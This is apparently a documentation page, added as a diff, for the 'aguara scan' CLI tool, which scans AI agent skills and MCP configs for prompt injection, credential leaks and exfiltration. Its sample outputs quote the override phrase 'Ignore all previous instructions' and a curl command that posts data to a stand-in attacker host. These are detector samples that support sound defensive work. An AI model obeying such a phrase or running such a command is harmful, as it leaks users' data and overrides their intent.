@@ -1,0 +1,404 @@
+---
+title: aguara scan
+description: Scan files and directories for security vulnerabilities
+---
+
+## Overview
+
+The `aguara scan` command analyzes files and directories for security issues including prompt injections, credential leaks, exfiltration attempts, and more. It runs 148+ built-in detection rules across 14 security categories.
+
+## Usage
+
+```bash
+aguara scan [path] [flags]
+```
+
+### Basic Examples
+
+```bash
+# Scan current directory
+aguara scan .
+
+# Scan specific directory
+aguara scan ./skills/
+
+# Scan with CI defaults (fail on high+, no color)
+aguara scan --ci ./skills/
+
+# JSON output
+aguara scan --format json ./skills/ -o results.json
+
+# Only scan changed files in git
+aguara scan --changed .
+
+# Enable rug-pull detection
+aguara scan --monitor ./skills/
+```
+
+## Flags
+
+<ParamField path="path" type="string" required>
+  Directory or file to scan. Required unless using `--auto` flag.
+</ParamField>
+
+<ParamField path="--auto" type="boolean" default="false">
+  Auto-discover and scan all MCP client configurations. When enabled, no path argument should be provided.
+  
+  ```bash
+  aguara scan --auto
+  ```
+</ParamField>
+
+<ParamField path="--fail-on" type="string">
+  Exit with code 1 if findings at or above this severity are found.
+  
+  **Valid values:** `critical`, `high`, `medium`, `low`
+  
+  ```bash
+  aguara scan . --fail-on high
+  ```
+</ParamField>
+
+<ParamField path="--ci" type="boolean" default="false">
+  CI mode: equivalent to `--fail-on high --format terminal --no-color`
+  
+  ```bash
+  aguara scan --ci .
+  ```
+</ParamField>
+
+<ParamField path="-v, --verbose" type="boolean" default="false">
+  Show rule descriptions for critical and high severity findings in terminal output.
+  
+  ```bash
+  aguara scan -v .
+  ```
+</ParamField>
+
+<ParamField path="--changed" type="boolean" default="false">
+  Only scan git-changed files (staged, unstaged, untracked). Useful for faster pre-commit scans.
+  
+  ```bash
+  aguara scan --changed .
+  ```
+</ParamField>
+
+<ParamField path="--monitor" type="boolean" default="false">
+  Enable rug-pull detection: tracks file hashes across runs to detect malicious changes in previously scanned files.
+  
+  ```bash
+  aguara scan --monitor .
+  ```
+</ParamField>
+
+<ParamField path="--state-path" type="string" default="~/.aguara/state.json">
+  Path to state file for `--monitor` mode. Only used when `--monitor` is enabled.
+  
+  ```bash
+  aguara scan --monitor --state-path ./aguara-state.json .
+  ```
+</ParamField>
+
+<ParamField path="--max-file-size" type="string" default="50MB">
+  Maximum file size to scan. Accepts human-readable sizes (e.g., `50MB`, `100MB`).
+  
+  **Range:** 1MB–500MB
+  
+  ```bash
+  aguara scan --max-file-size 100MB .
+  ```
+</ParamField>
+
+### Global Flags (inherited)
+
+These flags are available from the root command:
+
+<ParamField path="--severity" type="string" default="info">
+  Minimum severity to report.
+  
+  **Valid values:** `critical`, `high`, `medium`, `low`, `info`
+  
+  ```bash
+  aguara scan --severity medium .
+  ```
+</ParamField>
+
+<ParamField path="--format" type="string" default="terminal">
+  Output format.
+  
+  **Valid values:** `terminal`, `json`, `sarif`, `markdown`
+  
+  ```bash
+  aguara scan --format json .
+  ```
+</ParamField>
+
+<ParamField path="-o, --output" type="string">
+  Output file path. If not specified, writes to stdout.
+  
+  ```bash
+  aguara scan --format json -o results.json .
+  ```
+</ParamField>
+
+<ParamField path="--rules" type="string">
+  Path to custom rules directory. Rules are loaded in addition to built-in rules.
+  
+  ```bash
+  aguara scan --rules ./custom-rules/ .
+  ```
+</ParamField>
+
+<ParamField path="--disable-rule" type="string[]">
+  Rule IDs to disable (can be specified multiple times).
+  
+  ```bash
+  aguara scan --disable-rule EXFIL_005 --disable-rule CRED_001 .
+  ```
+</ParamField>
+
+<ParamField path="--no-color" type="boolean" default="false">
+  Disable ANSI color output. Also enabled by `NO_COLOR` environment variable.
+  
+  ```bash
+  aguara scan --no-color .
+  ```
+</ParamField>
+
+<ParamField path="--workers" type="integer" default="NumCPU">
+  Number of concurrent worker threads for scanning.
+  
+  ```bash
+  aguara scan --workers 8 .
+  ```
+</ParamField>
+
+## Output Formats
+
+### Terminal (default)
+
+Human-readable output with ANSI colors and severity histogram:
+
+```bash
+$ aguara scan ./skills/
+
+✗ CRITICAL  PROMPT_INJECTION_001  skills/evil.md:3
+  Instruction override attempt
+  > Ignore all previous instructions
+
+✗ HIGH      EXFIL_005            skills/webhook.md:12
+  Webhook data exfiltration
+  > curl -X POST https://attacker.com/exfil
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Scanned 5 files, loaded 148 rules
+2 findings: 1 critical, 1 high
+```
+
+### JSON
+
+Machine-parseable structured output:
+
+```bash
+aguara scan --format json .
+```
+
+```json
+{
+  "findings": [
+    {
+      "rule_id": "PROMPT_INJECTION_001",
+      "rule_name": "Instruction override attempt",
+      "severity": 4,
+      "category": "prompt-injection",
+      "description": "Detects attempts to override previous instructions",
+      "file_path": "skills/evil.md",
+      "line": 3,
+      "column": 0,
+      "matched_text": "Ignore all previous instructions",
+      "score": 60.0,
+      "analyzer": "pattern",
+      "in_code_block": false
+    }
+  ],
+  "files_scanned": 5,
+  "rules_loaded": 148,
+  "duration_ms": 42
+}
+```
+
+### SARIF
+
+GitHub Code Scanning compatible output (SARIF 2.1.0):
+
+```bash
+aguara scan --format sarif -o results.sarif .
+```
+
+### Markdown
+
+Ideal for GitHub Actions job summaries and PR comments:
+
+```bash
+aguara scan --format markdown .
+```
+
+## Exit Codes
+
+| Code | Meaning |
+|------|----------|
+| 0 | No findings above `--fail-on` threshold (or no `--fail-on` set) |
+| 1 | Findings at or above `--fail-on` severity, or any error |
+
+## Auto Mode
+
+The `--auto` flag enables automatic discovery and scanning of MCP client configurations:
+
+```bash
+aguara scan --auto
+```
+
+This will:
+1. Discover all MCP client configs on your machine (17 supported clients)
+2. Scan each configuration file
+3. Aggregate findings across all discovered configs
+
+**Note:** When using `--auto`, do not provide a path argument.
+
+## Incremental Scanning
+
+### Git-changed files
+
+Scan only modified files in your git repository:
+
+```bash
+aguara scan --changed .
+```
+
+This scans:
+- Staged files
+- Unstaged modifications
+- Untracked files
+
+### Rug-pull detection
+
+Track file hashes across scans to detect malicious modifications:
+
+```bash
+aguara scan --monitor .
+```
+
+If a previously scanned file changes and now contains dangerous patterns (instruction overrides, reverse shells, credential exfiltration), Aguara emits a `RUGPULL_001` finding with CRITICAL severity.
+
+State is stored in `~/.aguara/state.json` by default (customize with `--state-path`).
+
+## Configuration File
+
+Aguara loads `.aguara.yml` from the scan target directory (or parent):
+
+```yaml
+ignore:
+  - "vendor/"
+  - "node_modules/"
+  - "*.log"
+
+severity: info
+fail_on: high
+format: terminal
+rules: custom-rules/
+
+rule_overrides:
+  PROMPT_INJECTION_001:
+    severity: medium
+  EXFIL_005:
+    disabled: true
+```
+
+CLI flags override config file values.
+
+## Detection Capabilities
+
+Aguara runs four analysis engines:
+
+1. **Pattern Matcher**: 148+ regex/contains rules across 14 categories
+2. **NLP Injection**: Markdown AST analysis for hidden instructions
+3. **Toxic Flow**: Taint tracking (user input → dangerous sinks)
+4. **Rug-Pull**: Hash-based change detection (requires `--monitor`)
+
+### Rule Categories
+
+- `prompt-injection` (22 rules)
+- `credential-leak` (19 rules)
+- `exfiltration` (17 rules)
+- `external-download` (17 rules)
+- `supply-chain` (15 rules)
+- `command-execution` (16 rules)
+- `mcp-attack` (12 rules)
+- `ssrf-cloud` (10 rules)
+- `mcp-config` (8 rules)
+- `unicode-attack` (7 rules)
+- `indirect-injection` (6 rules)
+- `third-party-content` (5 rules)
+- `toxic-flow` (3 rules)
+- `rug-pull` (1 rule)
+
+See [list-rules](/cli/list-rules) for the complete rule set.
+
+## Performance Tips
+
+1. **Use `.aguaraignore`** to skip large directories:
+   ```
+   vendor/
+   node_modules/
+   .venv/
+   dist/
+   ```
+
+2. **Scan only changed files** during development:
+   ```bash
+   aguara scan --changed .
+   ```
+
+3. **Adjust worker threads** for large codebases:
+   ```bash
+   aguara scan --workers 16 .
+   ```
+
+4. **Increase max file size** if needed:
+   ```bash
+   aguara scan --max-file-size 100MB .
+   ```
+
+## CI/CD Integration
+
+### GitHub Actions
+
+```yaml
+- name: Run Aguara scan
+  run: aguara scan --ci --format sarif -o results.sarif .
+
+- name: Upload SARIF results
+  uses: github/codeql-action/upload-sarif@v3
+  with:
+    sarif_file: results.sarif
+```
+
+### GitLab CI
+
+```yaml
+security-scan:
+  script:
+    - aguara scan --ci --format json -o gl-sast-report.json .
+  artifacts:
+    reports:
+      sast: gl-sast-report.json
+```
+
+### Pre-commit Hook
+
+```bash
+#!/bin/sh
+aguara scan --changed --fail-on high --no-color
+```
+
+Or use `aguara init --hook` to generate automatically.
